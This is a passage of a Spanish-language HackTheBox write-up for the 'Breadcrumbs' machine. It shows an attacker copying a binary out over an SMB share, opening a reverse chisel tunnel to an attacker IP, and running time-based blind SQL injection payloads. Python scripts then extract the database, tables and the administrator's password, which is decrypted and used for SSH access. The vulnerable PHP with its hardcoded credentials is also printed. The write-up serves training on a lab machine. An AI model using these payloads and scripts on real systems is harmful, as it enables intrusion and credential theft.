+<pre><code class="language-powershell">PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState&gt; dir c:\Users
+
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/26/2021   9:06 AM                Administrator
+d-----         1/26/2021   9:11 AM                development
+d-----          2/1/2021   5:48 AM                juliette
+d-r---         1/15/2021   3:43 PM                Public
+d-----          2/8/2021  10:13 PM                www-data
+</code></pre>
+
+<p>Bien, existe…</p>
+
+<p>También vemos la traza del usuario <code>administrator</code>, pero de él no vemos nada relevante… Probemos con esa cadena contra el usuario <code>development</code> sobre el servicio <code>SSH</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_development_done.png" alt="316bash_SSH_development_done" /></p>
+
+<p>Opa, efectivamente, tenemos una sesión como <code>development</code>, a ver que encontramos en él…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>En la raíz del sistema encontramos una carpeta relacionada con nuestro usuario:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; dir
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/15/2021   4:03 PM                Anouncements
+d-----         1/15/2021   4:03 PM                Development
+d-----         12/7/2019   1:14 AM                PerfLogs
+d-r---          2/1/2021   7:50 AM                Program Files
+d-r---         12/7/2019   1:54 AM                Program Files (x86)
+d-r---         1/17/2021   1:41 AM                Users
+d-----          2/1/2021   1:10 AM                Windows
+
+PS C:\&gt;
+</code></pre>
+
+<p>Dentro tenemos:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; cd .\Development\
+PS C:\Development&gt; dir
+
+
+    Directory: C:\Development
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/29/2020   3:11 AM          18312 Krypter_Linux
+
+</code></pre>
+
+<p>Algo curioso es que el <code>owner</code> del archivo es <code>juliette</code>, pero con su sesión no podemos entrar en esa carpeta, jmm.</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; Get-Acl .\Krypter_Linux
+
+    Directory: C:\Development
+
+Path          Owner                Access
+----          -----                ------
+Krypter_Linux BREADCRUMBS\juliette NT AUTHORITY\SYSTEM Allow  ReadAndExecute, Synchronize...
+
+</code></pre>
+
+<ul>
+  <li><a href="https://devblogs.microsoft.com/scripting/hey-scripting-guy-how-can-i-use-windows-powershell-to-determine-the-owner-of-a-file/">Determine the owner of a file <strong>PowerShell</strong></a>.</li>
+</ul>
+
+<blockquote>
+  <p>Tambien podemos ver el owner en la cmd usando <code>dir /q</code>.</p>
+</blockquote>
+
+<p>Inspeccionemos el archivo… (No nos deja ejecutarlo)</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; type .\Krypter_Linux
+⌂ELF☻☺☺♥&gt;☺...
+...
+New project by Juliette.
+New features added weekly!
+What to expect next update:
+        - Windows version with GUI support
+        - Get password from cloud and AUTOMATICALLY decrypt!
+***
+Requesting decryption key from cloud...
+Account: Administratorhttp://passmanager.htb:1234/index.phpmethod=select&amp;username=administrator&amp;table=passwordsServer response:
+
+Incorrect master keyNo key supplied.
+USAGE:
+...
+</code></pre>
+
+<p>Vale vale valeeee, encontramos cosas interesantes:</p>
+
+<ul>
+  <li>Es un binario <code>ELF</code>.</li>
+  <li>Creado efectivamente por <code>juliette</code>.</li>
+  <li>Hace peticiones para desencriptar llaves desde la nube.</li>
+  <li><code>Account</code>: <code>Administrator</code> (raro)</li>
+  <li>Servicio sirviendo en el puerto <code>1234</code> del dominio <code>passmanager.htb</code>.</li>
+</ul>
+
+<pre><code class="language-html">http://passmanager.htb:1234/index.php?method=select&amp;username=administrator&amp;table=passwords
+</code></pre>
+
+<p>Podemos pensar en un <strong>Port Forwarding</strong>, validemos si el puerto esta escuchando localmente:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; netstat -a
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:22             Breadcrumbs:0          LISTENING
+  TCP    0.0.0.0:80             Breadcrumbs:0          LISTENING
+...
+  TCP    127.0.0.1:1234         Breadcrumbs:0          LISTENING
+...
+</code></pre>
+
+<p>Si lo esta…</p>
+
+<p>Intentemos pasarnos el binario a nuestra máquina, a ver si logramos ejecutarlo.</p>
+
+<p>Nos compartimos una carpeta con <code>SMB</code>, la llamaré <code>smbFolder</code>:</p>
+
+<pre><code class="language-bash">❭ python3 smbserver.py smbFolder $(pwd) -smb2support
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p>Y ahora en la máquina Windows, le indicamos que nos copie ese binario a través de una carpeta compartida en la red:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; copy .\Krypter_Linux \\10.10.14.194\smbFolder\Krypter_Linux
+</code></pre>
+
+<p>Recibimos info en nuestro servidor de la conexión entrante y ya tendríamos el binario:</p>
+
+<pre><code class="language-bash">❭ file Krypter_Linux 
+Krypter_Linux: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
+</code></pre>
+
+<pre><code class="language-bash">❭ ./Krypter_Linux 
+Krypter V1.2
+
+New project by Juliette.
+New features added weekly!
+What to expect next update:
+        - Windows version with GUI support
+        - Get password from cloud and AUTOMATICALLY decrypt!
+***
+
+No key supplied.
+USAGE:
+
+Krypter &lt;key&gt;
+</code></pre>
+
+<p>…</p>
+
+<p>Podemos apoyarnos de <code>cURL</code> e intentar visitar el recurso al cual se esta llamando en el binario:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; curl "http://passmanager.htb:1234/index.php?method=select&amp;username=administrator&amp;table=passwords"
+curl : The remote name could not be resolved: 'passmanager.htb'
+...
+</code></pre>
+
+<p>Exacto. Pero como ya vimos, esta localmente activo, asi que cambiémosla por <code>localhost</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; curl "http://localhost:1234/index.php?method=select&amp;username=administrator&amp;table=passwords"      
+curl : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the 
+UseBasicParsing parameter and try again.
+...
+</code></pre>
+
+<p>Nos indica que debemos agregarle el parámetro <code>UseBasicParsing</code> por unos temas de configuración con <code>Internet Explorer</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; curl "http://localhost:1234/index.php?method=select&amp;username=administrator&amp;table=passwords" -UseBasicParsing
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : selectarray(1) {
+                      [0]=&gt;
+                      array(1) {
+                        ["aes_key"]=&gt;
+                        string(16) "k19D193j.&lt;19391("
+                      }
+                    }
+
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 96
+                    Content-Type: text/html; charset=UTF-8
+                    Date: Sat, 13 Mar 2021 04:01:30 GMT
+                    Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+                    X-Powered-By: PHP/8.0.1
+
+                    sel...
+Forms             :
+Headers           : {[Content-Length, 96], [Content-Type, text/html; charset=UTF-8], [Date, Sat, 13 Mar 2021 04:01:30 GMT], [Server, Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1]...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        :
+RawContentLength  : 96
+
+</code></pre>
+
+<p>Ahora sí, tenemos una <code>aes_key</code>, una cabecera y nada más…</p>
+
+<p>Si provocamos un error obtenemos:</p>
+
+<pre><code class="language-powershell">PS C:\Development&gt; curl "http://localhost:1234/index.php?method=select&amp;username=administrator&amp;table='" -UseBasicParsing        
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : select&lt;br /&gt;
+                    &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in
+                    C:\Users\Administrator\Desktop\passwordManager\htdocs\index...
+RawContent        : HTTP/1.1 200 OK
+...
+</code></pre>
+
+<p>Probablemente debamos hacer <code>SQLi</code> o incluso <code>fuzzing</code> para encontrar otras tablas, pero intentando por consola no logre nada, además podemos pensar que el output es más grande y ejecutándolo por consola no nos lo muestra completo, quizás por medio de la web obtengamos algo diferente, hagamos el <code>Remote Port Forwarding</code>, usaré <a href="https://github.com/jpillora/chisel">chisel</a>:</p>
+
+<ul>
+  <li><a href="https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/">Uno de los recursos en que me guie</a>.</li>
+  <li><a href="https://www.youtube.com/watch?v=0rmG5EneRuQ&amp;t=4440s">S4vitar también tiene un video explicándolo</a>.</li>
+</ul>
+
+<p><strong>Atacante (server):</strong></p>
+
+<p>En <a href="https://github.com/jpillora/chisel/releases">su repo</a> descargar en binario para:</p>
+
+<ul>
+  <li><strong>Windows</strong>: <code>chisel_1.7.6_windows_amd64.gz</code>.</li>
+  <li><strong>Linux</strong>: <code>chisel_1.7.6_linux_amd64.gz</code>.</li>
+</ul>
+
+<blockquote>
+  <p>(Esto para tener la misma version en los dos binarios y que no nos genere problemas de compatibilidad)</p>
+</blockquote>
+
+<pre><code class="language-bash">#Para montarnos el server más adelante
+❭ gunzip chisel_1.7.6_linux_amd64.gz
+❭ mv chisel_1.7.6_linux_amd64 chisel
+❭ chmod +x chisel
+
+#El binario a subir en la máquina Windows (descargado del repo)
+❭ gunzip chisel_1.7.6_windows_amd64.gz
+❭ upx chisel_1.7.8_windows_amd64 #Hacemos el binario un toque más liviano
+❭ mv chisel_1.7.6_windows_amd64 chisel.exe
+❭ python3 smbserver.py smbFolder $(pwd) -smb2support
+...
+</code></pre>
+
+<p><strong>Victima (cliente):</strong></p>
+
+<pre><code class="language-powershell">PS C:\Users\development\Videos&gt; copy \\10.10.14.194\smbFolder\chisel.exe C:\Users\development\Videos\chisel.exe
+PS C:\Users\development\Videos&gt; .\chisel.exe
+
+  Usage: chisel [command] [--help]
+
+  Version: 1.7.6 (go1.16rc1)
+
+  Commands:
+    server - runs chisel in server mode
+    client - runs chisel in client mode
+
+  Read more:
+    https://github.com/jpillora/chisel
+
+</code></pre>
+
+<p><strong>Atacante (server):</strong></p>
+
+<pre><code class="language-bash">#Nos ponemos en escucha por el puerto 1111
+❭ ./chisel server -p 1111 --reverse
+2021/03/13 25:25:25 server: Reverse tunnelling enabled
+2021/03/13 25:25:25 server: Fingerprint 1kWWQwYT0YxKjY9xsxSSL76G0IJLlLThmvRQ+t/ZdoE=
+2021/03/13 25:25:25 server: Listening on http://0.0.0.0:1111
+</code></pre>
+
+<p><strong>Victima (cliente):</strong></p>
+
+<pre><code class="language-powershell">PS C:\Users\development\Videos&gt; .\chisel.exe client 10.10.14.194:1111 R:1234:localhost:1234
+2021/03/12 25:25:25 client: Connecting to ws://10.10.14.194:1111
+2021/03/12 25:25:25 client: Connected (Latency 117.0553ms)
+...
+</code></pre>
+
+<ul>
+  <li>Le indicamos el puerto e IP en el que estamos escuchando: <code>10.10.14.194:1111</code>.</li>
+  <li>Cuando obtengamos la conexión, el puerto <code>1111</code> pasara a ser el puerto <code>1234</code> que se esta sirviendo localmente <code>localhost:1234</code>.</li>
+</ul>
+
+<p><strong>Atacante (server):</strong></p>
+
+<pre><code class="language-bash">...
+2021/03/13 25:25:25 server: session#1: tun: proxy#R:1234=&gt;localhost:1234: Listening
+</code></pre>
+
+<p>Listo, validemos:</p>
+
+<pre><code class="language-bash">❭ curl "http://localhost:1234/index.php?method=select&amp;username=administrator&amp;table=passwords"
+selectarray(1) {
+  [0]=&gt;
+  array(1) {
+    ["aes_key"]=&gt;
+    string(16) "k19D193j.&lt;19391("
+  }
+}
+</code></pre>
+
+<p>En la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page1234_remPortFort_done.png" alt="316page1234_remPortFort_done" /></p>
+
+<p>…</p>
+
+<p>Despues de algo de pruebas sobre la URL, logramos obtener nuestro <code>SQLi</code> (es uno basado en tiempo), el parámetro vulnerable es <code>username</code>, con este simple payload logramos darle a la página un tiempo de respuesta de <code>5</code> segundos, si refrescamos y la página se demora ese tiempo, quiere decir que tenemos inyección (:</p>
+
+<pre><code class="language-html">http://127.0.0.1:1234/index.php?method=select&amp;username=administrator' AND sleep(5) AND '1'='1&amp;table=passwords
+o
+http://127.0.0.1:1234/index.php?method=select&amp;username=a' OR sleep(5) AND '1'='1&amp;table=passwords
+</code></pre>
+
+<p>Listo, podemos crearnos un script para automatizar la extracción de la data.</p>
+
+<p><strong>(Si recordamos cuando encontramos el archivo <code>db.php</code> habla de la base de datos llamada <code>bread</code>, podríamos saltarnos este paso, pero igual se los quiero mostrar para que vean como es el proceso)</strong></p>
+
+<p>…</p>
+
+<h3 id="sqli-blind">SQL injection - time based (blind) <a href="#sqli-blind">⌖</a></h3>
+
+<hr />
+
+<h5 id="obtenemos-nombre-de-la-base-de-datos">Obtenemos nombre de la <u>base de datos</u>.</h5>
+
+<p>👀</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests, time
+from pwn import *
+
+url = "http://localhost:1234/index.php"
+
+p1 = log.progress("SQLi blind")
+p2 = log.progress("Database name")
+
+session = requests.Session()
+
+# Creamos nuestro "diccionario"
+dic_letters = "abcdefghijklmnopqrstuvwxyz0123456789.+!$#-~}:\"\'{*][%,&amp;/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+result = ""
+
+# Recorrera 16 posiciones en la palabra, osea para intentar encontrar 16 caracteres
+for position in range(1, 16):
+    # Toma cada caracter de nuestro "dic"
+    for letter in dic_letters:
+        # Extrae el tiempo antes de la peticion
+        time_now = time.time()
+
+        payload = "?method=select&amp;"
+        payload += "username=administrator' and if(substr(database(),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (position, letter)
+        payload += "table=passwords"
+
+        p1.status(payload)
+        r = session.get(url + payload)
+
+        # Extrae el tiempo despues de la peticion
+        time_after = time.time()
+
+        # Validamos los tiempos, si hay diferencia de 3 o más, sabemos que esa peticion hablo con la base de datos, por lo tanto extraemos la letra 
+        if time_after - time_now &gt; 2:
+            result += letter
+            p2.status(result)
+            break
+
+p1.success("Done")
+p2.success(result)
+</code></pre>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_db_name.py">extract_db_name.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_dbname.png" alt="316bash_scriptSQLi_dbname" /></p>
+
+<p><em>No sé por qué toma los <code>+</code> como caracteres válidos, pero bueno, obtenemos el nombre de la base de datos: <code>bread</code></em>.</p>
+
+<p>…</p>
+
+<h5 id="obtenemos-tablas-de-la-base-de-datos-bread">Obtenemos tablas de la base de datos <ins>bread</ins>.</h5>
+
+<p>👀</p>
+
+<pre><code class="language-py">...
+# Para ir iterando entre las tablas, en este caso iterar en 5 tablas (asi evitamos errores)
+for table_num in range(0, 5):
+    p4 = log.progress("Table name")
+    for position in range(1, 16):
+        for letter in dic_letters:
+            time_now = time.time()
+
+            payload = "?method=select&amp;"
+            payload += "username=administrator' and if(substr((SELECT table_name FROM information_schema.tables WHERE table_schema='bread' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (table_num, position, letter)
+            payload += "table=passwords"
+...
+</code></pre>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_table_names.py">extract_tables.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_tables.png" alt="316bash_scriptSQLi_tables" /></p>
+
+<p>Interesante, solo hay una tabla llamada <code>passwords</code>, extraigamos sus columnas…</p>
+
+<p>…</p>
+
+<h5 id="obtenemos-columnas-de-la-tabla-passwords">Obtenemos columnas de la tabla <u>passwords</u>.</h5>
+
+<p>👀</p>
+
+<pre><code class="language-py">...
+# Iteramos entre las columnas
+for column_num in range(0, 5):
+    p4 = log.progress("Column name")
+    for position in range(1, 16):
+        for letter in dic_letters:
+            time_now = time.time()
+
+            payload = "?method=select&amp;"
+            payload += "username=administrator' and if(substr((SELECT column_name FROM information_schema.columns WHERE table_schema='bread' and table_name='passwords' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (column_num, position, letter)
+            payload += "table=passwords"
+...
+</code></pre>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_column_names.py">extract_columns.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_columns.png" alt="316bash_scriptSQLi_columns" /></p>
+
+<p>Perfecto, tenemos 4 columnas, enfoquémonos en las columnas <code>account</code> y <code>password</code> para asi entender de quien es cada password.</p>
+
+<blockquote>
+  <p><code>aeskey</code> es realmente <code>aes_key</code>, me di cuenta relacionandolo con la respuesta normal antes de hacer el SQLi (y pues que me faltaba ese char en el dic).</p>
+</blockquote>
+
+<p>…</p>
+
+<h5 id="obtenemos-la-información-de-la-columna-account">Obtenemos la información de la columna <u>account</u>.</h5>
+
+<p>👀</p>
+
+<pre><code class="language-py">...
+for acc_num in range(0, 3):
+    p4 = log.progress("Account")
+    for position in range(1, 16):
+        for letter in dic_letters:
+            time_now = time.time()
+
+            payload = "?method=select&amp;"
+            payload += "username=administrator' and if(substr((SELECT account FROM passwords LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (acc_num, position, letter)
+            payload += "table=passwords"
+...
+</code></pre>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_users.py">extract_users.py</a></p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_acc.png" alt="316bash_scriptSQLi_acc" /></p>
+
+<p>Nice, solo hay un usuario, <code>administrator</code>, ahora veamos el contenido del campo <code>password</code> relacionado con el usuario <code>administrator</code>.</p>
+
+<p>…</p>
+
+<h5 id="obtenemos-la-información-de-la-columna-password">Obtenemos la información de la columna <u>password</u>.</h5>
+
+<p>👀</p>
+
+<pre><code class="language-py">...
+p2 = log.progress("Password administrator")
+# Agregamos mas posiciones, quizas la contraseña es larga
+for position in range(1, 70):
+    for letter in dic_letters:
+        time_now = time.time()
+
+        payload = "?method=select&amp;"
+        payload += "username=administrator' and if(substr((SELECT password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (position, letter)
+        payload += "table=passwords"
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_pass.png" alt="316bash_scriptSQLi_pass" /></p>
+
+<p>Opa, (vemos los <code>+</code> asi que cortamos desde ahí) obtenemos la contraseña del usuario <code>administrator</code>. (Antes de probarla contra <code>SSH</code>) creo que no nos va a funcionar, ya que no distinguió entre mayúsculas y minúsculas… Y pues es muy raro que no tengamos ni una mayúscula en una password tan larga.</p>
+
+<p>Intentamos conectarnos por medio de <code>SSH</code>:</p>
+
+<pre><code class="language-bash">❭ ssh administrator@10.10.10.228
+administrator@10.10.10.228's password: 
+Permission denied, please try again.
+</code></pre>
+
+<p>Efectivamente, no logramos entrar, asi que buscando en internet hay dos maneras para que <code>mysql</code> haga uso del <code>case sensitive</code>, la más sencilla es usar <code>BINARY</code> al lado del objeto que estamos buscando:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/16581560/how-to-check-username-and-password-case-sensitive/16581688">How to check case sensitive SQL</a>.</li>
+  <li><a href="https://medium.com/@nyomanpradipta120/blind-sql-injection-ac36d2c4daab">La segunda manera, usando valores ascii</a>.</li>
+</ul>
+
+<blockquote>
+  <p><strong>SPOILER MÁQUINA CACHE</strong>: La manera de los valores ascii la use en la <a href="https://lanzt.github.io/blog/htb/HackTheBox-Cache#explotacion">máquina <strong>Cache</strong></a>, por si quieren hecharle un ojo.</p>
+</blockquote>
+
+<p>👀</p>
+
+<pre><code class="language-py">...
+        payload = "?method=select&amp;"
+        payload += "username=administrator' and if(substr((SELECT BINARY password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&amp;" % (position, letter)
+        payload += "table=passwords"
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_pass_caseSensitive.png" alt="316bash_scriptSQLi_pass_caseSensitive" /></p>
+
+<p>Listo, ahora si (además que no nos muestra los <code>+</code>, asi que solucionamos dos problemas en uno), pero intentando con esa contraseña no obtenemos acceso tampoco…</p>
+
+<blockquote>
+  <p>Acá fue donde pense en la columna <code>aes_key</code> y que me faltaba el char “<code>_</code>” en el dic, (aca aún no me habia dado cuenta que me faltaba) asi que lo agregue y volvi a intentar, pero no, obtenemos la misma contraseña.</p>
+</blockquote>
+
+<p>Asi que debemos hacer algo con:</p>
+
+<pre><code class="language-html">H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=
+</code></pre>
+
+<p>Si relacionamos la <code>aes-key</code> podemos pensar que debemos usarla para desencriptar la password y despues ahí si usarla contra el usuario <code>administrator</code> sobre <code>SSH</code>…</p>
+
+<ul>
+  <li><a href="https://www.devglan.com/online-tools/aes-encryption-decryption">Usando esta web, logramos desencriptar la cadena</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_aesdecrypt.png" alt="316google_aesdecrypt" /></p>
+
+<p>Nos responde con una cadena en <code>base64</code>, si la tomamos y la decodeamos obtenemos la contraseña real:</p>
+
+<pre><code class="language-bash">❭ echo "cEBzc3cwcmQhQCMkOTg5MC4v" | base64 -d ; echo
+p@ssw0rd!@#$9890./
+</code></pre>
+
+<p>Yyyy si ahora intentamos por <code>SSH</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_ssh_admin_done.png" alt="316bash_ssh_admin_done" /></p>
+
+<p>SIIIIIIIIIIIIIIIIIIIIIIIII, ufff somos el usuario <strong>administrator</strong> dentro de la máquina.</p>
+
+<p>Y si, solo nos quedarían ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316flags.png" alt="316flags" /></p>
+
+<p>…</p>
+
+<p>Les dejo el código vulnerable al <code>SQLi</code> por si le quieren echar un ojo:</p>
+
+<pre><code class="language-powershell">PS C:\Users\Administrator\Desktop\passwordManager\htdocs&gt; type .\index.php
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+
+$host="localhost";
+$port=3306;
+$user="passwordM";
+$password="hWjSh812jDn1asd./213-91!#(";
+$dbname="bread";
+$method = "";
+$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
+if(isset($_REQUEST['method'])){
+        $method = $_REQUEST['method'];
+}
+echo $method;
+if($method == "select"){
+        $sql = "SELECT aes_key FROM ".$_REQUEST['table']." WHERE account='".$_REQUEST['username']."'";
+        $results = $con-&gt;query($sql);
+
+        echo var_dump(mysqli_fetch_all($results,MYSQLI_ASSOC));
+}
+
+else{
+        echo "Bad Request";
+}
+</code></pre>
+
+<p>…</p>
+
+<p>Linda máquina, mucho jugueteo con inyecciones, lo cual me encantó. El <code>LFI</code> fue loco de encontrar, pero prestando atención lo logramos. El tema de las <code>cookies</code> no sé que tan real puede ser (me suena que si), pero me gusto bastante también. Y la inyección <code>SQL</code> la disfruté un montón. En definitiva, excelente máquina para practicar este tipo de ataques.</p>
+
+<p>Además me sirvió para practicar mi scripting y crear lindos recursos para futuros usos:</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py"><strong>RCE</strong> mediante el archivo <strong>.php</strong> (me gusto resto el script)</a>.</li>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi"><strong>SQLi</strong>, fases para obtener la info de la base de datos</a>.</li>
+</ul>
+
+<p>Por fin hemos llegado al final (<strong>e.e 🏃‍♀️ la disfruté mucho</strong>) nos leeremos en otra ocasión y como siempre, muchas gracias y a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Breadcrumbs&url=http://localhost:4000/htb/breadcrumbs" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#AES">AES</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#JWT">JWT</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LFI">LFI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SQLi">SQLi</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cookie-hijacking">cookie-hijacking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#port-forwarding">port-forwarding</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/sink">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" alt="HackTheBox - Sink"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/sink">HackTheBox - Sink</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">18 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
